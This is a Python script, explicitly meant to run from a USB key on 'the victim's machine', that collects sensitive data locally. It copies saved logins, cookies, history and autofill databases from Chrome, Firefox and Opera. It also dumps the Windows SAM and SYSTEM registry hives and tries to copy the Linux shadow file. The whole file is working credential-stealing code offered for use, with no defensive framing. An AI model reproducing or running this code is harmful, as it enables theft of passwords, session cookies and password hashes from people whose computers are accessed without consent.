#For an optimal use, please run this script from an usb key plugged
#into the victim's machine.

#the data will be stored in the [hostname]_caught_data folder.





import shutil
import os
import getpass
import platform
class data_catcher():

    def __init__(self):
        #global var
        self.hostname = getpass.getuser()
        self.current_dir = os.getcwd()
        self.catcher()



    def catcher(self):
        print("[!]===== THIS SCRIPT MUST BE USED FROM AN USB KEY =====")
        print("[!]Making directories...")
        try:            
            os.mkdir("{}_caught_data".format(self.hostname))
            os.mkdir("{}_caught_data/Chrome".format(self.hostname))
            os.mkdir("{}_caught_data/Firefox".format(self.hostname))
            os.mkdir("{}_caught_data/Edge".format(self.hostname))
            os.mkdir("{}_caught_data/Opera".format(self.hostname))
            os.mkdir("{}_caught_data/Internet_Explorer".format(self.hostname))
            os.mkdir("{}_caught_data/OS_W_SAM".format(self.hostname))
            os.mkdir("{}_caught_data/OS_W_SYSTEM".format(self.hostname))
            os.mkdir("{}_caught_data/OS_L_Shadow".format(self.hostname))
        except:
            print("[x]An error occured while manking directories")




        #this script will not catch anything if the user
        # uses a custom installation directory



        print("[+]DATA RECUPERATION FOR {}".format(self.hostname))


        #Chrome files
        print("[!]Chrome data recuperation...")
        try:
            print("\tHistory")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History".format(self.hostname),
                "{}\\{}_caught_data\\Chrome\\History".format(self.current_dir,self.hostname))
            except:
                pass
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\System Profile\\History".format(self.hostname),
                "{}\\{}_caught_data\\Chrome\\History2".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tCookies")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies".format(self.hostname),
                "{}\\{}_caught_data\\Chrome\\Cookies".format(self.current_dir,self.hostname))
            except:
                pass
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\System Profile\\Cookies".format(self.hostname),
                "{}\\{}_caught_data\\Chrome\\Cookies2".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tGoogle profile picture")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Google Profile Picture.png".format(self.hostname),
                "{}\\{}_caught_data\\Chrome\\Google Profie Picture.png".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tBookmarks")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks".format(self.hostname),
                "{}\\{}_caught_data\\Chrome\\Bookmarks".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tLogin Data")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data".format(self.hostname),
                "{}\\{}_caught_data\\Chrome\\Login Data".format(self.current_dir,self.hostname))
            except:
                pass
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\System Profile\\Login Data".format(self.hostname),
                "{}\\{}_caught_data\\Chrome\\Login Data2".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tWeb Data")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\System Profile\\Web Data".format(self.hostname),
                "{}\\{}_caught_data\\Chrome\\Web Data".format(self.current_dir,self.hostname))
            except:
                pass
        except:
            print("[x]An error occured while catching Chrome sensitive files")
            
        print("[+]Chrome sensitive files caught")



        #Mozilla files
        print("[!]Mozilla Firefox sensitive files recuperation...")
        try:
            print("\tBookmars/Downloads/history in one file")
            for x in os.listdir("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\".format(self.hostname)):
                uname = x
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{}\\places.sqlite".format(self.hostname,uname),
            "{}\\{}_caught_data\\Firefox\\places.sqlite".format(self.current_dir,self.hostname))
            print("\tPasswords file 1")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{}\\key4.db".format(self.hostname,uname),
                "{}\\{}_caught_data\\Firefox\\key4.db".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tPassword file 2")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{}\\logins.json".format(self.hostname,uname),
                "{}\\{}_caught_data\\Firefox\\logins.json".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tPersonal dictionnay")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{}\\persdict.dat".format(self.hostname,uname),
                "{}\\{}_caught_data\\Firefox\\persdict.dat".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tAutocomplete History")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{}\\formhistory.sqlite".format(self.hostname,uname),
                "{}\\{}_caught_data\\Firefox\\formhistory.sqlite".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tCookies")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{}\\Cookies.sqlite".format(self.hostname,uname),
                "{}\\{}_caught_data\\Firefox\\Cookies.sqlite".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tDOM storage")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{}\\webappstore.sqlite".format(self.hostname,uname),
                "{}\\{}_caught_data\\Firefox\\webappstore.sqlite".format(self.current_dir,self.hostname))
            except:
                pass
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{}\\chromeappstore.sqlite".format(self.hostname,uname),
                "{}\\{}_caught_data\\Firefox\\chromeappstore.sqlite".format(self.current_dir,self.hostname))
            except:
                pass
            print("\tUser preference")
            try:
                shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{}\\prefs.json".format(self.hostname,uname),
                "{}\\{}_caught_data\\Firefox\\prefs.json".format(self.current_dir,self.hostname))
            except:
                pass
        except:
            print("[x]An error occured while catching Mozilla Firefox sensitive files")

        print("[+]Firefox sensitive files caught")


        #Opera files
        print("[!]Opera sensitive files recuperation...")
        print("\tBookmarks")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Bookmarks".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\Bookmarks".format(self.current_dir,self.hostname))
        except:
            pass
        print("\tCookies")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\Cookies".format(self.current_dir,self.hostname))
        except:
            pass
        print("\tHistory")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\History".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\History".format(self.current_dir,self.hostname))
        except:
            pass
        print("\tLast Session")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Last Session".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\Last Session".format(self.current_dir,self.hostname))
        except:
            pass
        print("\tLast Tabs")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Last Tabs".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\Last Tabs".format(self.current_dir,self.hostname))
        except:
            pass
        print("\tUser preference")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\".format(self.current_dir,self.hostname))
        except:
            pass
        print("\tLogin Data")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\Login Data".format(self.current_dir,self.hostname))
        except:
            pass
        print("\tSecure Preferences")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Secure Preferences".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\Secure Preferences".format(self.current_dir,self.hostname))
        except:
            pass
        print("\tShortcuts")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Shortcuts".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\Shortcuts".format(self.current_dir,self.hostname))
        except:
            pass
        print("\tVisited Links")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Visited Links".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\Visited Links".format(self.current_dir,self.hostname))
        except:
            pass
        print("\tWeb Data")
        try:
            shutil.copyfile("C:\\Users\\{}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data".format(self.hostname),
            "{}\\{}_caught_data\\Opera\\Web Data".format(self.current_dir,self.hostname))
        except:
            pass

        print("[+]Opera sensitive files caught")



        #who really uses Edge or IE ??
        print("[!]Microsoft Edge sensitive files recuperation...")
        print("[+]Microsoft Edge sensitive files caught")


        #OS sensitive files
        if platform.system() == 'Windows':
            print("[!]SAM file recuperation...")
            try:
                os.system("""reg save HKLM\\SAM "{}/{}_caught_data/OS_W_SAM/SAM" """.format(self.current_dir,self.hostname))
                os.system("""reg save HKLM\\SYSTEM "{}/{}_caught_data/OS_W_SYSTEM/SYSTEM" """.format(self.current_dir,self.hostname))
                print("[+]SAM file caught")
            except:
                print("[x]Error in SAM or SYSTEM file catching")


        elif platform.system() == 'Linux':
            print("[!]Shadow file recuperation...")
            try:
             shutil.copyfile("etc/shadow","{}/{}_caught_data/OS_L_Shadow/Shadow".format(self.current_dir,self.hostname))
            except:
                pass

        
        #displaying what you've caught 
        print("=====Files caught=====")

        print("Chrome : ")
        for x in os.listdir("{}\\{}_caught_data\\Chrome\\".format(self.current_dir,self.hostname)):
            print("\t{}".format(x))

        print("Mozilla Firefox : ")
        for x in os.listdir("{}\\{}_caught_data\\Firefox\\".format(self.current_dir,self.hostname)):
            print("\t{}".format(x))

        print("Opera : ")
        for x in os.listdir("{}\\{}_caught_data\\Opera\\".format(self.current_dir,self.hostname)):
            print("\t{}".format(x))

        print("Microsoft Edge : ")
        for x in os.listdir("{}\\{}_caught_data\\Edge\\".format(self.current_dir,self.hostname)):
            print("\t{}".format(x))

        print("Microsoft Internet Explorer : ")
        for x in os.listdir("{}\\{}_caught_data\\Internet_Explorer\\".format(self.current_dir,self.hostname)):
            print("\t{}".format(x))
        

        if platform.system() == "Windows":
            print("SAM file : ")
            for x in os.listdir("{}/{}_caught_data/OS_W_SAM/".format(self.current_dir,self.hostname)):
                print("\t{}".format(x))

            print("SYSTEM file : ")
            for x in os.listdir("{}/{}_caught_data/OS_W_SYSTEM/".format(self.current_dir,self.hostname)):
                print("\t{}".format(x))

        elif platform.system() == "Linux":
            print("Shadow file : ")
            for x in os.listdir("{}/{}_caught_data/OS_L_Shadow/".format(self.current_dir,self.hostname)):
                print("\t{}".format(x))

if __name__ == '__main__':
    data_cather1 = data_catcher()

#if you didn't got any files, i think it's because you're dumb but my script is also pretty " possiblement claqué au sol" like we say in France